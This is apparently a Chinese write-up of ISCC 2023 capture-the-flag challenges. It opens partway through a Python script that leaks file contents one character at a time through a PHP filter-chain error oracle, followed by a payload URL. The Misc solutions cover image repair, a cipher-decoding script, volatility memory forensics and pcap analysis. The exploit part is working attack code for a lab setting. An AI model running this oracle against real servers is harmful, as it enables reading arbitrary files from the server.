<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;i&#x27;</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># I J K</span>
<span class="hljs-keyword">if</span>
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;K&#x27;</span>
<span class="hljs-keyword">elif</span>
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>
):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;J&#x27;</span>
<span class="hljs-keyword">elif</span> req(
f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;</span>
<span class="hljs-string">blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;I&#x27;</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># v w x</span>
<span class="hljs-keyword">if</span> req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;x&#x27;</span>
<span class="hljs-keyword">elif</span>
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;w&#x27;</span>
<span class="hljs-keyword">elif</span> req(
f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blo</span>
<span class="hljs-string">w_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;v&#x27;</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># V W X</span>
<span class="hljs-keyword">if</span>
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;</span>
<span class="hljs-string">&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;X&#x27;</span>
<span class="hljs-keyword">elif</span> req(
f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;</span>
<span class="hljs-string">blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;W&#x27;</span>
<span class="hljs-keyword">elif</span> req(
f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;</span>
<span class="hljs-string">|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;V&#x27;</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># Z</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;Z&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># z</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;z&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># M</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;M&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blo</span>
<span class="hljs-string">w_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># m</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;m&#x27;</span>
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># y</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;y&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># Y</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;Y&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># l</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;l&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;bl</span>
<span class="hljs-string">ow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># L</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;L&#x27;</span>
<span class="hljs-keyword">elif</span> not req(
f<span class="hljs-string">&#x27;&#123;prefix&#125;|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dec</span>
<span class="hljs-string">hunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># h</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;h&#x27;</span>
<span class="hljs-keyword">elif</span> not req(
f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|st</span>
<span class="hljs-string">ring.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># H</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;H&#x27;</span>
<span class="hljs-keyword">elif</span> not req(
f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|strin</span>
<span class="hljs-string">g.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># u</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;u&#x27;</span>
<span class="hljs-keyword">elif</span> not req(
f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.4</span>
<span class="hljs-string">37.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># U</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;U&#x27;</span>
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># g</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;g&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># G</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;G&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># t</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;t&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_in</span>
<span class="hljs-string">f&#125;&#x27;</span>):
<span class="hljs-comment"># T</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;T&#x27;</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-built_in">print</span>()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(2000):
prefix = f<span class="hljs-string">&#x27;&#123;header&#125;|&#123;get_nth(i)&#125;&#x27;</span>
letter = find_letter(prefix)
<span class="hljs-comment"># it&#x27;s a number! check base64</span>
<span class="hljs-keyword">if</span> letter == <span class="hljs-string">&#x27;*&#x27;</span>:
prefix = f<span class="hljs-string">&#x27;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode&#x27;</span>
s = find_letter(prefix)
<span class="hljs-keyword">if</span> s == <span class="hljs-string">&#x27;M&#x27;</span>:
<span class="hljs-comment"># 0 - 3</span>
prefix = f<span class="hljs-string">&#x27;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;&#x27;</span>
ss = find_letter(prefix)
<span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:
letter = <span class="hljs-string">&#x27;0&#x27;</span>
<span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:
letter = <span class="hljs-string">&#x27;1&#x27;</span>
<span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ijklmn&#x27;</span>:
letter = <span class="hljs-string">&#x27;2&#x27;</span>
<span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;yz*&#x27;</span>:
letter = <span class="hljs-string">&#x27;3&#x27;</span>
<span class="hljs-keyword">else</span>:
err(f<span class="hljs-string">&#x27;bad num (&#123;ss&#125;)&#x27;</span>)
<span class="hljs-keyword">elif</span> s == <span class="hljs-string">&#x27;N&#x27;</span>:
<span class="hljs-comment"># 4 - 7</span>
prefix = f<span class="hljs-string">&#x27;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;&#x27;</span>
ss = find_letter(prefix)
<span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:
letter = <span class="hljs-string">&#x27;4&#x27;</span>
<span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:
letter = <span class="hljs-string">&#x27;5&#x27;</span>
<span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ijklmn&#x27;</span>:
letter = <span class="hljs-string">&#x27;6&#x27;</span>
<span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;yz*&#x27;</span>:
letter = <span class="hljs-string">&#x27;7&#x27;</span>
<span class="hljs-keyword">else</span>:
err(f<span class="hljs-string">&#x27;bad num (&#123;ss&#125;)&#x27;</span>)
<span class="hljs-keyword">elif</span> s == <span class="hljs-string">&#x27;O&#x27;</span>:
<span class="hljs-comment"># 8 - 9</span>
prefix = f<span class="hljs-string">&#x27;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;&#x27;</span>
ss = find_letter(prefix)
<span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:
letter = <span class="hljs-string">&#x27;8&#x27;</span>
<span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:
letter = <span class="hljs-string">&#x27;9&#x27;</span>
<span class="hljs-keyword">else</span>:
err(f<span class="hljs-string">&#x27;bad num (&#123;ss&#125;)&#x27;</span>)
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;wtf&#x27;</span>)
<span class="hljs-built_in">print</span>(end=letter)
o += letter
sys.stdout.flush()
<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span>
<span class="hljs-string">We are done!! :)</span>
<span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span>
<span class="hljs-built_in">print</span>()
<span class="hljs-built_in">print</span>(o)
d = b64decode(o.encode() + b<span class="hljs-string">&#x27;=&#x27;</span> * 4)
<span class="hljs-comment"># remove KR padding</span>
d = d.replace(b<span class="hljs-string">&#x27;$)C&#x27;</span>, b<span class="hljs-string">&#x27;&#x27;</span>)
<span class="hljs-built_in">print</span>(b64decode(d))</code></pre>
<p>然后会得到一半 flag 和其他的 key（有提示，多试几次就好了）<br>之后观察页面，更改格式得到另一半的 flag<br><img src="https://img-blog.csdnimg.cn/3b6c01ad12ff46cab0f8e6d9d661f7d0.png" alt="在这里插入图片描述"><br>Payload=shell.php?lastkey=DoUlikemyOrcle&amp;file=shell.php</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="好看的维吾尔族小姐姐"><a href="#好看的维吾尔族小姐姐" class="headerlink" title="好看的维吾尔族小姐姐"></a>好看的维吾尔族小姐姐</h2><p>下载附件，用010Editor打开文件<br><img src="https://img-blog.csdnimg.cn/2ab6f67c930648dc998b2e3550991e6e.png#pic_center" alt="在这里插入图片描述"><br>通过文件头信息知道这是PNG文件<br>用010更改图片的宽和高，发现有类似于二维码的图形出现。截屏保存，使用在线图片翻转<a target="_blank" rel="noopener" href="https://www.gaitubao.com/xuanzhuan%E5%B0%86%E5%85%B6%E8%BF%9B%E8%A1%8C%E5%B7%A6%E5%8F%B3%E9%95%9C%E5%83%8F%E7%BF%BB%E8%BD%AC%E5%BE%97%E5%88%B0%E4%BA%8C%E7%BB%B4%E7%A0%81%EF%BC%8C%E7%94%A8%E6%94%AF%E4%BB%98%E5%AE%9D%E6%89%AB%E6%8F%8F%E5%90%8E%E5%BE%97%E5%88%B0">https://www.gaitubao.com/xuanzhuan将其进行左右镜像翻转得到二维码，用支付宝扫描后得到</a></p>
<blockquote>
<p>;521#&amp;;33#&amp;;101#&amp;;011#&amp;;111#&amp;;001#&amp;;801#&amp;;801#&amp;;101#&amp;;911#&amp;;59#&amp;;611#&amp;;501#&amp;;59#&amp;;611#&amp;;111#&amp;;301#&amp;;59#&amp;;711#&amp;;111#&amp;;121#&amp;;321#&amp;;76#&amp;;76#&amp;;38#&amp;;37#&amp;</p>
</blockquote>
<p>按照正确的形式，将其反过来得到</p>
<blockquote>
<p>&#73;&#83;&#67;&#67;&#123;&#121;&#111;&#117;&#95;&#103;&#111;&amp;#1**;&amp;#<strong>;&amp;#</strong>*;&amp;#*16;&#95;&#119;&#101;&#108;&#108;&#100;&#111;&#110;&#101;&#33;&#125;</p>
</blockquote>
<p>得到flag</p>
<h2 id="人生之路"><a href="#人生之路" class="headerlink" title="人生之路"></a>人生之路</h2><p>附件下载得到一个名为flag压缩包和一个名为人生之路的图片。打开压缩包需要密码，解压缩密码为图片名称，即人生之路.jpeg。解压之后得到flag.txt文件，对其内容进行凯撒爆破位移，然后匹配密码表，得到码表如下：</p>
<blockquote>
<p>“saIsIwIdIwaIsdIsI”: “A”,<br>    “sZwZdZsZaZdZsZaZ”: “B”,<br>    “aZsZdZ”: “C”,<br>    “sZwZdZsZaZ”: “D”,<br>    “dZaZsIdZaZsIdZ”: “E”,<br>    “dZaZsZaIdZ”: “F”,<br>    “aZsZdZwIaI”: “G”,<br>    “sZwIdZwIsZ”: “H”,<br>    “dZaIsZaIdZ”: “I”,<br>    “dZaIsZaI”: “J”,<br>    “sZwIdIdwIsaIsdI”: “K”,<br>    “sZdZ”: “L”,<br>    “wZsdIwdIsZ”: “M”,<br>    “wZsdZwZ”: “N”,<br>    “sZdZwZaZ”: “O”,<br>    “sZwZdZsIaZ”: “P”,<br>    “aZwZdZsZsdI”: “Q”,<br>    “sZwZdZsIaZdZsI”: “R”,<br>    “aZsIdZsIaZ”: “S”,<br>    “dZaIsZ”: “T”,<br>    “sZdZwZ”: “U”,<br>    “sIsdIdwIwI”: “V”,<br>    “sdZwdZsdZwdZ”: “W”,<br>    “sdZwaIwdIsaZ”: “X”,<br>    “sdIwdIsaIsI”: “Y”,<br>    “dZsaZdZ”: “Z”,<br>    “aIsIaIdIsIdI”: “{“,<br>    “dIsIdIaIsIaI”: “}”</p>
</blockquote>
<p>flag.txt文件中打开得到</p>
<blockquote>
<p>mIjRbIjRmI jIbRmIbRjI jIbImI jIbImI jRbRjRmRbRmR bRbmRmfRfR bImIfIjI mIjIbRmIjIbRmI fIbmRfmRbI bIfRmRmfRbjRbmR mIjRbIjR mIjRbI jIbImI bjRbRfRmRfjRbmRbR bImIfI bIfImIbIjImIbIjI mIjRbI jIfImIbIbmR bmIfjRfmRbjI bRbmRmfRfR mRbRmRjRbRjR </p>
</blockquote>
<p>写脚本：</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> string
c=<span class="hljs-string">&quot;mIjRbIjRmI jIbRmIbRjI jIbImI jIbImI jRbRjRmRbRmR bRbmRmfRfR bImIfIjI mIjIbRmIjIbRmI fIbmRfmRbI bIfRmRmfRbjRbmR mIjRbIjR mIjRbI jIbImI bjRbRfRmRfjRbmRbR bImIfI bIfImIbIjImIbIjI mIjRbI jIfImIbIbmR bmIfjRfmRbjI bRbmRmfRfR mRbRmRjRbRjR &quot;</span>.strip()
a=c.split(<span class="hljs-string">&quot; &quot;</span>)
a=<span class="hljs-built_in">list</span>(a[<span class="hljs-number">0</span>])
p=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:
    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> string.ascii_lowercase:
        i=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">97</span>+p)%<span class="hljs-number">26</span>+<span class="hljs-number">97</span>)
        <span class="hljs-keyword">while</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;wasd&quot;</span>:
            i=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">97</span>+<span class="hljs-number">1</span>)%<span class="hljs-number">26</span>+<span class="hljs-number">97</span>)
            p+=<span class="hljs-number">1</span>
    <span class="hljs-keyword">elif</span> i <span class="hljs-keyword">in</span> string.ascii_uppercase:
        i=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">65</span>+p)%<span class="hljs-number">26</span>+<span class="hljs-number">65</span>)
        <span class="hljs-keyword">while</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ZI&quot;</span>:
            i=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">65</span>+<span class="hljs-number">1</span>)%<span class="hljs-number">26</span>+<span class="hljs-number">65</span>)
            p+=<span class="hljs-number">1</span>
a=<span class="hljs-built_in">list</span>(c)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):
    <span class="hljs-keyword">if</span> a[i]==<span class="hljs-string">&quot; &quot;</span>:
        <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">if</span> a[i] <span class="hljs-keyword">in</span> string.ascii_lowercase:
            a[i]=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(a[i])-<span class="hljs-number">97</span>+p)%<span class="hljs-number">26</span>+<span class="hljs-number">97</span>)
        <span class="hljs-keyword">elif</span> a[i] <span class="hljs-keyword">in</span> string.ascii_uppercase:
            a[i]=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(a[i])-<span class="hljs-number">65</span>+p)%<span class="hljs-number">26</span>+<span class="hljs-number">65</span>)
a=<span class="hljs-string">&quot;&quot;</span>.join(a)
a=a.split(<span class="hljs-string">&quot; &quot;</span>)
<span class="hljs-built_in">map</span>=&#123;
    <span class="hljs-string">&quot;saIsIwIdIwaIsdIsI&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>,
    <span class="hljs-string">&quot;sZwZdZsZaZdZsZaZ&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>,
    <span class="hljs-string">&quot;aZsZdZ&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>,
    <span class="hljs-string">&quot;sZwZdZsZaZ&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>,
    <span class="hljs-string">&quot;dZaZsIdZaZsIdZ&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>,
    <span class="hljs-string">&quot;dZaZsZaIdZ&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>,
    <span class="hljs-string">&quot;aZsZdZwIaI&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>,
    <span class="hljs-string">&quot;sZwIdZwIsZ&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>,
    <span class="hljs-string">&quot;dZaIsZaIdZ&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>,
    <span class="hljs-string">&quot;dZaIsZaI&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>,
    <span class="hljs-string">&quot;sZwIdIdwIsaIsdI&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>,
    <span class="hljs-string">&quot;sZdZ&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>,
    <span class="hljs-string">&quot;wZsdIwdIsZ&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>,
    <span class="hljs-string">&quot;wZsdZwZ&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>,
    <span class="hljs-string">&quot;sZdZwZaZ&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>,
    <span class="hljs-string">&quot;sZwZdZsIaZ&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>,
    <span class="hljs-string">&quot;aZwZdZsZsdI&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>,
    <span class="hljs-string">&quot;sZwZdZsIaZdZsI&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,
    <span class="hljs-string">&quot;aZsIdZsIaZ&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>,
    <span class="hljs-string">&quot;dZaIsZ&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>,
    <span class="hljs-string">&quot;sZdZwZ&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>,
    <span class="hljs-string">&quot;sIsdIdwIwI&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>,
    <span class="hljs-string">&quot;sdZwdZsdZwdZ&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>,
    <span class="hljs-string">&quot;sdZwaIwdIsaZ&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>,
    <span class="hljs-string">&quot;sdIwdIsaIsI&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>,
    <span class="hljs-string">&quot;dZsaZdZ&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>,
    <span class="hljs-string">&quot;aIsIaIdIsIdI&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>,
    <span class="hljs-string">&quot;dIsIdIaIsIaI&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>
&#125;
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">map</span>[i],end=<span class="hljs-string">&#x27;&#x27;</span>)
<span class="hljs-built_in">print</span>()</code></pre>
<h2 id="菜鸟黑客-1"><a href="#菜鸟黑客-1" class="headerlink" title="菜鸟黑客-1"></a>菜鸟黑客-1</h2><p>先下载附件发现一个raw文件<br><img src="https://img-blog.csdnimg.cn/7dc8337d428441be8c44d63397c6de39.png" alt="在这里插入图片描述"><br>用R-Studio打开进行扫描<br><img src="https://img-blog.csdnimg.cn/33ccf26c7de64a3e90542fc63eac56a0.png" alt="在这里插入图片描述"><br>发现flag文件<br><img src="https://img-blog.csdnimg.cn/8ce489b39b1c4c9ab0a7766b9e2e79fd.png" alt="在这里插入图片描述"><br>打开后发现一个DES编码<br><img src="https://img-blog.csdnimg.cn/25cb84a2db284648abb2ca8346c1c5c9.png" alt="在这里插入图片描述"><br>对这个进行DES解码就得到了flag：ISCC{dbsy_cdis_fd7n_s4fd}</p>
<h2 id="菜鸟黑客-2"><a href="#菜鸟黑客-2" class="headerlink" title="菜鸟黑客-2"></a>菜鸟黑客-2</h2><p>1、 先看看桌面有什么<br>volatility -f 1.raw –profile=Win2008R2SP1x64 filescan | grep Desktop<br>发现这个图片<br><img src="https://img-blog.csdnimg.cn/833bd468530f4cdf82697cd955059a06.png#pic_center" alt="在这里插入图片描述"><br>2、 把图片 down 下来<br>volatility -f 1.raw –profile=Win2008R2SP1x64 dumpfiles -Q 0x000000007dfaff20 -D ./<br>得到一个表情包图片<br>3、 用 formost 分离一下，得到一个压缩包，压缩包的密码是前面看到 ISCC2023<br>4、 解压后得到文本内容，提示要维吉尼亚 解 MEQL{invk_vhlu_dzel_lkof}<br>5、 Editbox 看一下 volatility -f 1.raw –profile=Win2008R2SP1x64 editbox<br>得到提示 Pay attention to emoji’s eyes<br><img src="https://img-blog.csdnimg.cn/d28a1e6637ba4059b0a6d349ccb60b17.png#pic_center" alt="在这里插入图片描述"><br>6、 结合前面的表情包，园眼睛 . 长眼睛 - 解摩斯，得到 EMOJIISFUN<br><img src="https://img-blog.csdnimg.cn/d1690fb6fd73493c8d78e97deb196f69.png#pic_center" alt="在这里插入图片描述"><br>7 .维吉尼亚解出来 ISCC{afdf_buhi_pqwd_tfus}<br><img src="https://img-blog.csdnimg.cn/9f6785b495e043109dc443888cc5ab8a.png#pic_center" alt="在这里插入图片描述"></p>
<h2 id="汤姆历险记"><a href="#汤姆历险记" class="headerlink" title="汤姆历险记"></a>汤姆历险记</h2><p>附件下载，用010打开Tom.jpg文件，文件头没有问题，继续往下翻，发现编译问题<br><img src="https://img-blog.csdnimg.cn/909e2b7c568e4224962adfa30e1daf1f.png#pic_center" alt="在这里插入图片描述"><br>将这一长串复制下来，打开CTF编码工具，进行字频分析<br><img src="https://img-blog.csdnimg.cn/b4fbb7a1d7f04b368b5637954b1189ff.png#pic_center" alt="在这里插入图片描述"><br>得到类似flag，将文件改成zip格式发现一个同名的docx文件，打开需要密码，即为刚解出来的字符串，打开文档发现行间距有的是1，有的是1.5，中间还有空行。尝试将其变形成二进制，结果错误。将其变成摩斯密码，即</p>
<blockquote>
<p>… -. -.. –. .- -.- . .-</p>
</blockquote>
<p>摩斯密码解密后结果为</p>
<blockquote>
<p>sndgakea</p>
</blockquote>
<p>对照字典为a0mdf59f，即为正确flag</p>
<h2 id="信息传递"><a href="#信息传递" class="headerlink" title="信息传递"></a>信息传递</h2><p>附件下载后有PCAPNG文件，用Wireshark打开，找到IMF文件，导出IMF文件<br><img src="https://img-blog.csdnimg.cn/8fc01a466f1a4e4098d788a2682ddaed.png#pic_center" alt="在这里插入图片描述"><br>用QQ邮箱打开这两个文件，发现一个普通附件，发送出去后从接收端打开<br>发现压缩包文件需要密码，试了好多都不对。观察CRC32的数据，发现只有B1852B0D和9DE9E501两种，将其用二进制0和1表示，得到二进制数据</p>
<blockquote>
<p>0100100101010011010000110100001101111011011010010011001001110011001100000110001100110010011000110011001101111101</p>
</blockquote>
<p>将二进制转换成字符串得到flag，再通过题目所给的字典进行替换得到最终的flag</p>
